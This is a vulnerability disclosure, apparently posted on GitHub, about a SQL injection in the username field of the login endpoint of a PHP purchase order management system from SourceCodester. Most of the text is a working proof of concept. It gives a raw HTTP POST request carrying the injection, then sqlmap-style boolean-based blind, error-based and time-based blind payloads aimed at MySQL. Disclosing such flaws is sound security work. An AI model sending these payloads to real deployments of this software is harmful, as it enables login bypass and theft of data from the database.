## Purchase Order Management System has SQL injection vulnerability
vendor: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html
Vulnerability file: /purchase_order/classes/Login.php
![image](https://user-images.githubusercontent.com/80438059/164885270-15b0d1fc-3adf-4162-8afb-886f999224eb.png)
Vulnerability location: /purchase_order/classes/Login.php?f=login //username is Injection point
```
POST /purchase_order/classes/Login.php?f=login HTTP/1.1
Host: localhost
Content-Length: 44
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/purchase_order/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fipkbpl70m5ol078ohb2d50ais
Connection: close

username=admin'and 1=1 --+&password=admin123
```
[+]Payload: 
```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 7306=7306 AND 'KUHr'='KUHr&password=admin123

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 6871 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(6871=6871,1))),0x7178766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'cGqF'='cGqF&password=admin123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 9249 FROM (SELECT(SLEEP(5)))tmUV) AND 'cjHA'='cjHA&password=admin123
---
```

![image](https://user-images.githubusercontent.com/80438059/164885401-545b57bb-4b17-427a-a79c-27eb50cdec61.png)

